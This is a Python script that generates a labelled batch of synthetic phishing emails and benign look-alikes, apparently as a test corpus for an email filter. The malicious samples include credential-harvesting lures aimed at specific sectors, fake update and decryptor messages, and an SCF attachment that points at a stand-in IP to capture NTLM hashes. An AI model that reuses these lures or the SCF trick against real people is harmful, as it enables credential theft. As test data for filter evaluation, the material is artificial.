#!/usr/bin/env python3
"""Batch 19: sector-targeted APT lures + new access vectors + look-alike ham."""
import base64, json, os
HERE = os.path.dirname(os.path.abspath(__file__)); ROOT = os.path.dirname(HERE)
LABELS = []
def W(n, raw): open(os.path.join(ROOT, "synth", n), "wb").write(raw)
def HD(disp, frm, to, subj, extra="", ct="text/plain; charset=utf-8"):
    b = base64.b64encode(disp.encode()).decode()
    return (f"From: =?utf-8?B?{b}?= <{frm}>\r\nTo: {to}\r\n"
            f"Date: Fri, 11 Sep 2026 08:{10+len(LABELS)%49:02d}:00 +0800\r\n"
            f"Message-ID: <{len(LABELS):04d}-b19@synth.example>\r\n" + extra +
            f"Subject: {subj}\r\nMIME-Version: 1.0\r\nContent-Type: {ct}\r\n\r\n")
def ATT(hdr, t, fn, ct, b64):
    return (hdr + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
            f"--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n{t}\r\n"
            f"--BS\r\nContent-Type: {ct}\r\nContent-Disposition: attachment; filename=\"{fn}\"\r\n"
            f"Content-Transfer-Encoding: base64\r\n\r\n{b64}\r\n--BS--\r\n")
def E(n, raw, label, family, tech, note="", lang="zh", fmt="plain",
      expected=None, ambiguous=False, borderline=""):
    W(n, raw if isinstance(raw, bytes) else raw.encode())
    LABELS.append({"file": f"synth/{n}", "case_id": n[:-4], "label": label,
        "family": family, "language": lang, "techniques": tech,
        "expected": expected or ("block" if label == "malicious" else "deliver"),
        "engine_status": "not_evaluated", "synthetic": True, "batch": 19,
        "format": fmt, "note": note, "ambiguous": ambiguous, "borderline": borderline})

# ---- sector lures ----
E("mal_0306_grid_dispatch.eml",
  HD("调度通信", "dispatch@grid-tmpl.example", "grid-ops@corp.internal",
     "调度指令模板修订（第3版）")
  + "各位厂站：调度指令模板按新规修订，电子版见附件，\r\n"
  "纸质版以班组学习记录为准。\r\n"
  + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
  "--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n见正文。\r\n"
  "--BS\r\nContent-Type: application/zip\r\nContent-Disposition: attachment; filename=\"调度模板V3.zip\"\r\n"
  "Content-Transfer-Encoding: base64\r\n\r\n"
  + base64.b64encode(b"PK\x03\x04" + b"\x00"*48).decode() + "\r\n--BS--\r\n",
  "malicious", "apt", ["energy_grid_dispatch", "zip_payload"], "电网调度话术+压缩载荷")

E("mal_0307_swift_notice.eml",
  HD("SWIFT Support", "noreply@swift-notify-gateway.example", "treasury@corp.internal",
     "MT103 field update acknowledgement required")
  + "Dear customer,\n\n"
  "Field 57A amendments on your recent MT103s need acknowledgement before\r\n"
  "cut-off. Acknowledge via: https://swift-notify-gateway.example/ack/mt103\r\n"
  "(Use your SWIFT credentials.)\n",
  "malicious", "apt", ["financial_swift_lure", "credentials"], "报文话术收凭据", "en")

E("mal_0308_cdc_survey.eml",
  HD("流调协作组", "liu diao@cdc-collab.example", "clinic@corp.internal",
     "本周流调问卷与个案表（协作版）")
  + "本周个案表模板有更新，请下载后离线填写：\r\n"
  "https://cdc-collab.example/forms/week37\r\n"
  "（含 Excel 宏版与纯表版，建议用宏版自动校验）\r\n",
  "malicious", "apt", ["health_cdc_lure", "macro_version_push"], "疾控话术+推宏版表")

E("mal_0309_lab_apply.eml",
  HD("重点实验室秘书处", "sec@keylab-apply.example", "research@corp.internal",
     "2026年度重点实验室申报：形式审查意见")
  + "您好：形式审查有三处需补正（附件批注版）。\r\n"
  "补正说明与重新提交入口：https://keylab-apply.example/revise/2026\r\n"
  "（申报系统账号+单位公邮验证码登录）\r\n",
  "malicious", "apt", ["academic_lab_apply", "sms_code_collect"], "科研申报收验证码")

E("mal_0310_defense_expo.eml",
  HD("展会服务", "visitor@defense-expo.example", "bd@corp.internal",
     "观展证件激活（防务技术展 2026）")
  + "您的观展证件已生成，激活后入场：\r\n"
  "https://defense-expo.example/badge/act?id=V8842\r\n"
  "（需单位邮箱+手机号核验）\r\n",
  "malicious", "apt", ["defense_expo_lure"], "防务展证件话术")

E("mal_0311_securedrop_fake.eml",
  HD("投稿部", "tips@news-desk.example", "journalist@corp.internal",
     "安全爆料通道使用说明（更新）")
  + "Hi,\n\n"
  "Our SecureDrop instance moved. New onion + guide:\n"
  "https://news-desk-example.securedrop.site/guide\n"
  "Verify the fingerprint before submitting.\n",
  "malicious", "apt", ["fake_securedrop"], "记者定向：假爆料通道", "en")

E("mal_0312_ngo_grant.eml",
  HD("项目资助", "grant@intl-fund.example", "ngo@corp.internal",
     "小额快速资助通道（第4季度）")
  + "您好：第四季度快速资助窗口开放，申请表与预算模板：\r\n"
  "https://intl-fund.example/apply/q4\r\n"
  "（需机构账号+负责人证件扫描）\r\n",
  "malicious", "apt", ["ngo_grant_collect"], "NGO 资助收证件")

E("mal_0313_bill_of_lading.eml",
  HD("单证服务", "doc@shipping-bl.example", "trade@corp.internal",
     "提单确认（BL No. COSU6260988）")
  + "您好：提单草本请确认，电子章版见附件，确认后放货。\r\n"
  + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
  "--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n见正文。\r\n"
  "--BS\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=\"BL_COSU6260988.scr\"\r\n"
  "Content-Transfer-Encoding: base64\r\n\r\n"
  + base64.b64encode(b"MZ\x90\x00" + b"\x00"*64).decode() + "\r\n--BS--\r\n",
  "malicious", "apt", ["shipping_bl_scr_payload"], "航运提单+屏保伪装载荷")

# ---- new access vectors ----
E("mal_0314_ics_task.eml",
  ATT(HD("会务", "cal@rt-calendar.example", "research@corp.internal",
         "行动项：会前完成预读"),
      "添加到任务后自动提醒。",
      "tasks.ics", "text/calendar",
      B("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VTODO\r\nSUMMARY:会前预读\r\n"
        "DESCRIPTION:预读材料 https://rt-pre.example.info/m\r\nEND:VTODO\r\nEND:VCALENDAR\r\n")
      if False else base64.b64encode("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VTODO\r\nSUMMARY:预读\r\nDESCRIPTION:https://rt-pre.example.info/m\r\nEND:VTODO\r\nEND:VCALENDAR\r\n".encode()).decode()),
  "malicious", "apt", ["ics_todo_injection"], "VTODO 任务注入绕过日历过滤")

E("mal_0315_ntlm_scf.eml",
  HD("共享", "share@doc-share6.example", "eng@corp.internal", "共享文件夹更新")
  + "共享里的模板库更新了，下载这个快捷方式直接挂载：\r\n"
  + "Content-Type: multipart/mixed; boundary=\"BS\"\r\n\r\n"
  "--BS\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n见正文。\r\n"
  "--BS\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=\"templates.scf\"\r\n"
  "Content-Transfer-Encoding: base64\r\n\r\n"
  + base64.b64encode(b"[Shell]\r\nIconResource=\\\\203.0.113.95\\icon\r\n").decode()
  + "\r\n--BS--\r\n",
  "malicious", "apt", ["scf_ntlm_hash_grab"], "SCF/INI 触发 NTLM 哈希回传")

E("mal_0316_zoom_update.eml",
  HD("Zoom 通知", "notify@zoom-upd.example", "staff@corp.internal",
     "Zoom 5.17 安全更新（手动安装）")
  + "您好：\r\n\r\n"
  "部分企业环境的 Zoom 客户端无法自动更新，本次为强制安全版本。\r\n"
  "手动安装包：https://zoom-upd.example/dl/5.17.2\r\n\r\n"
  "安装后无需重启。\r\n",
  "malicious", "apt", ["fake_meeting_client_update"], "假会议客户端更新")

E("mal_0317_browser_update.eml",
  HD("IT 支持中心", "it@browser-update-relay.example", "staff@corp.internal",
     "Chrome 零日补丁（紧急手动更新）")
  + "Chrome 存在在野零日，企业策略下自动更新延迟。\r\n"
  "手动安装补丁包：https://chrome-patch-relay.example/115.0.5790\r\n"
  "（内网分发，需域账号验证下载）\r\n",
  "malicious", "apt", ["fake_browser_zero_day_patch"], "零日补丁话术+域账号验证")

E("mal_0318_fake_decryptor.eml",
  ATT(HD("数据恢复", "help@decrypt-service.example", "dcops@corp.internal",
         "勒索事件恢复：官方解密工具（测试版）"),
      "针对本轮加密的测试解密器见附件，先在备份副本上试。",
      "decryptor_test.exe", "application/x-dosrun",
      base64.b64encode(b"MZ\x90\x00" + b"\x00"*64).decode()),
  "malicious", "apt", ["fake_decryptor_second_stage"],
  "勒索事件后的二次攻击（假解密器）")

E("mal_0319_npm_maintainer.eml",
  HD("OpenJS Foundation", "support@openjs-funds.example", "dev@corp.internal",
     "Maintainer transfer inquiry: tower-lsp")
  + "Hi,\n\n"
  "We coordinate stewardship transfers for dormant packages. If you're open to\r\n"
  "transferring tower-lsp, review the process: https://openjs-funds.example/transfer\r\n"
  "(Registry SSO required.)\n",
  "malicious", "apt", ["fake_maintainer_transfer"], "收 npm 凭据投毒前奏", "en")

E("mal_0320_app_password.eml",
  HD("邮箱迁移", "migrate@mail-move-svc.example", "staff@corp.internal",
     "个人邮箱数据迁移（授权码方式）")
  + "为把旧邮箱通信录迁入企业邮箱，请按步骤生成'应用专用密码'并回复本邮件：\r\n"
  "1. 登录旧邮箱账户安全页\r\n2. 生成应用专用密码\r\n3. 将 16 位密码回复给我们完成迁移\r\n",
  "malicious", "apt", ["app_password_harvest"], "以迁移名义收应用专用密码")

# ---- look-alike ham (15) ----
E("ham_0276_grid_real.eml",
  HD("调度通信", "dispatch@grid.internal", "grid-ops@corp.internal",
     "调度指令模板修订（第3版）")
  + "模板修订版已发布在安全生产系统-资料库（账号单点登录），\r\n"
  "纸质版以班组学习记录为准。\r\n",
  "benign", "ham_business", ["grid_real_internal_system"], "与电网钓鱼同形（走内部系统）")

E("ham_0277_swift_real.eml",
  HD("SWIFT", "noreply@swift.example", "treasury@corp.internal",
     "Monthly statement available")
  + "Your monthly SWIFT statement is ready in the secure portal (existing session):\n"
  "https://www.swift.example/statements\n",
  "benign", "ham_business", ["swift_real_portal"], "", "en")

E("ham_0278_cdc_real.eml",
  HD("流调协作组", "liudiao@cdc.example", "clinic@corp.internal",
     "本周个案表（协作版）")
  + "个案表模板在协作文档库（统一身份登录），\r\n"
  "只提供纯表版，不含宏。\r\n",
  "benign", "ham_business", ["cdc_real_no_macro"], "与疾控钓鱼同形（明确无宏版）")

E("ham_0279_lab_real.eml",
  HD("重点实验室秘书处", "sec@keylab.example", "research@corp.internal",
     "申报形式审查意见（内网系统）")
  + "形式审查意见已写入申报系统（校内统一身份登录查看），\r\n"
  "补正直接在系统内上传，不走邮件。\r\n",
  "benign", "ham_business", ["lab_real_system_only"], "与申报钓鱼同形")

E("ham_0280_expo_real.eml",
  HD("展会服务", "visitor@defense-expo.example", "bd@corp.internal",
     "观展证件已激活")
  + "您的观展证件已激活（报名时已核验，无需再操作）。\r\n"
  "电子票在展会小程序查看。\r\n",
  "benign", "ham_business", ["expo_real_no_reverify"], "真证件核验一次即完成")

E("ham_0281_securedrop_real.eml",
  HD("投稿部", "tips@newsdesk.example", "journalist@corp.internal",
     "SecureDrop 指引（内部版）")
  + "我们的 SecureDrop 指引在内部 wiki（站内可达）：\r\n"
  "https://wiki.newsdesk.example/securedrop\r\n"
  "切勿使用邮件里收到的任何'新洋葱地址'。\r\n",
  "benign", "ham_business", ["securedrop_real_wiki_warning"], "真指引自带防伪提醒")

E("ham_0282_grant_real.eml",
  HD("项目资助", "grant@fund.example", "ngo@corp.internal",
     "快速资助申请回执")
  + "您的申请已提交成功（编号 Q4-8842），\r\n"
  "评审结果 11 月邮件通知；我们不索要证件扫描件。\r\n",
  "benign", "ham_business", ["grant_real_no_docs"], "真资助回执不收证件")

E("ham_0283_bl_real.eml",
  HD("单证服务", "doc@shipping.example", "trade@corp.internal",
     "提单确认（BL No. COSU6260988）")
  + "提单草本请在线确认（订舱平台内），确认后放货。\r\n"
  "单证不经邮件附件流转。\r\n",
  "benign", "ham_business", ["bl_real_platform"], "与提单钓鱼同形")

E("ham_0284_zoom_real.eml",
  HD("IT 服务台", "helpdesk@corp.internal", "staff@corp.internal",
     "Zoom 客户端统一升级（自动）")
  + "Zoom 已由企业策略自动升级至 5.17.2，无需手动操作。\r\n"
  "如提示失败，重启客户端即可；任何'手动安装包'邮件请上报。\r\n",
  "benign", "ham_business", ["zoom_real_policy_autoupdate"], "真升级靠策略自动+反诈提醒")

E("ham_0285_chrome_real.eml",
  HD("IT 服务台", "helpdesk@corp.internal", "staff@corp.internal",
     "Chrome 零日补丁（已推送）")
  + "Chrome 115.0.5790 补丁已通过企业策略全量推送，\r\n"
  "重启浏览器生效。我们从不通过邮件分发安装包。\r\n",
  "benign", "ham_business", ["chrome_real_policy"], "与假补丁同形")

E("ham_0286_decryptor_real.eml",
  HD("安全厂商", "no-reply@av-vendor.example", "dcops@corp.internal",
     "本轮家族解密工具（官网公告）")
  + "针对该家族的免费解密工具已发布：\r\n"
  "https://www.av-vendor.example/decrypt/2026-09\r\n"
  "（工具仅从官网下载；恢复前请先隔离备份）\r\n",
  "benign", "ham_business", ["decryptor_real_vendor_site"], "真解密器只在官网")

E("ham_0287_npm_real.eml",
  HD("npm", "support@npmjs.example", "dev@corp.internal",
     "Stewardship transfer: official process")
  + "If you wish to transfer tower-lsp, use the repository Settings page\r\n"
  "(Transfer ownership). npm staff will never email you links to start it.\n",
  "benign", "ham_business", ["npm_real_settings_only"], "真转让只在仓库设置页", "en")

E("ham_0288_migration_real.eml",
  HD("IT 服务台", "helpdesk@corp.internal", "staff@corp.internal",
     "个人邮箱迁移指引（自助）")
  + "迁移工具在门户-邮箱-迁移，全程系统内授权（OAuth 弹窗），\r\n"
  "任何索要'应用专用密码/授权码'的邮件都是钓鱼。\r\n",
  "benign", "ham_business", ["migration_real_oauth_only"], "真迁移只走 OAuth 弹窗")

E("ham_0289_ics_real.eml",
  HD("行政台", "admin-desk@corp.internal", "research@corp.internal",
     "行动项提醒已由系统发送")
  + "会前预读行动项已通过日历系统推送（无链接，材料在共享盘 /rt/pre/）。\r\n"
  "日历提醒不再附带外部链接。\r\n",
  "benign", "ham_business", ["ics_real_no_link"], "真任务提醒不带链接")

E("ham_0290_ntlm_shared_real.eml",
  HD("IT 服务台", "helpdesk@corp.internal", "eng@corp.internal",
     "模板库更新（内网共享）")
  + "模板库更新已同步到 \\\\file.corp.internal\\templates，\r\n"
  "映射盘符即可；不提供任何'快捷方式挂载'文件。\r\n",
  "benign", "ham_business", ["shared_real_unc_internal"],
  "与 SCF 钓鱼同形（真共享是内网 UNC）")

with open(os.path.join(ROOT, "synth", "labels.jsonl"), "a", encoding="utf-8") as f:
    for e in LABELS: f.write(json.dumps(e, ensure_ascii=False) + "\n")
print(f"batch19 written: {len(LABELS)} samples")
